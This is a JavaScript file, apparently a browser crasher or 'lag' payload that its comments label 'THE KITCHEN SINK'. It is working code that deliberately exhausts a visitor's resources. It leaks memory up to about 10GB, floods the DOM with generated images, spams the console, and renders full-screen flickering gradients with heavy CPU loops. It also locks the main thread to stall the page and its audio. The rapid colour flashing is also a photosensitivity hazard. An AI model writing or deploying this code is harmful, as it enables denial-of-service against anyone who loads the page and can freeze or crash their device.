/** * PROTOCOL: THE KITCHEN SINK
 * TARGET: EVERYTHING
 */

const canvas = document.getElementById('canvas-layer');
const ctx = canvas.getContext('2d', { alpha: false });
const pit = document.getElementById('image-pit');
const ramSink = [];

canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

// --- 1. THE RAM GRENADE (Stable Leak) ---
// We allocate 100MB blocks of random data every 200ms
setInterval(() => {
    if (ramSink.length < 100) { // Limit to ~10GB to avoid instant OS crash
        const buffer = new Float64Array(12500000); 
        for(let i=0; i<buffer.length; i++) buffer[i] = Math.random();
        ramSink.push(buffer);
    }
}, 200);

// --- 2. IMAGE SPAM (DOM/Memory Exhaustion) ---
// We create thousands of unique base64 images
function spawnImage() {
    const img = new Image();
    // Using a tiny canvas to generate unique noise images
    const tempC = document.createElement('canvas');
    tempC.width = tempC.height = 10;
    const tCtx = tempC.getContext('2d');
    tCtx.fillStyle = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
    tCtx.fillRect(0,0,10,10);
    
    img.src = tempC.toDataURL();
    img.className = 'spam-img';
    pit.appendChild(img);
    
    if (pit.children.length > 2000) pit.removeChild(pit.firstChild);
}

// --- 3. THE CONSOLE "BLACK HOLE" ---
// Writing massive tables to the console is the fastest way to lag the UI thread
setInterval(() => {
    const junkData = Array.from({length: 50}, () => ({
        timestamp: Date.now(),
        noise: Math.random(),
        status: "CORE_MELTDOWN_ACTIVE",
        memory: ramSink.length + " GB STOLEN"
    }));
    console.clear();
    console.table(junkData);
    console.log("%c OH_LA_LA_TECH_LAG", "font-size: 50px; color: red; background: black;");
}, 50);

// --- 4. THE GPU "STUNNING" VISUALS ---
function render(t) {
    // Flickering Background
    ctx.fillStyle = `rgb(${Math.sin(t/100)*127+128}, 0, ${Math.cos(t/100)*127+128})`;
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    // 1000 High-Speed Gradients
    for(let i=0; i<500; i++) {
        const x = Math.random() * canvas.width;
        const y = Math.random() * canvas.height;
        const size = Math.random() * 300;
        
        const g = ctx.createRadialGradient(x, y, 0, x, y, size);
        g.addColorStop(0, `hsla(${(t/10+i)%360}, 100%, 50%, 0.8)`);
        g.addColorStop(1, 'transparent');
        
        ctx.fillStyle = g;
        ctx.globalCompositeOperation = (i % 2 == 0) ? 'screen' : 'difference';
        ctx.beginPath();
        ctx.arc(x, y, size, 0, Math.PI*2);
        ctx.fill();
    }

    // Heavy CPU math inside the render loop
    let dummy = 0;
    for(let j=0; j<2000000; j++) { dummy += Math.sqrt(j) * Math.sin(j); }

    // Spawn more images every frame
    spawnImage();
    spawnImage();

    requestAnimationFrame(render);
}

// --- 5. THE "MUSIC KILLER" (Main Thread Lock) ---
function lockThread() {
    const end = Date.now() + 50; // Lock for 50ms
    while (Date.now() < end) { Math.random() * Math.random(); }
    setTimeout(lockThread, 20); // Only release for 20ms
}

requestAnimationFrame(render);
lockThread();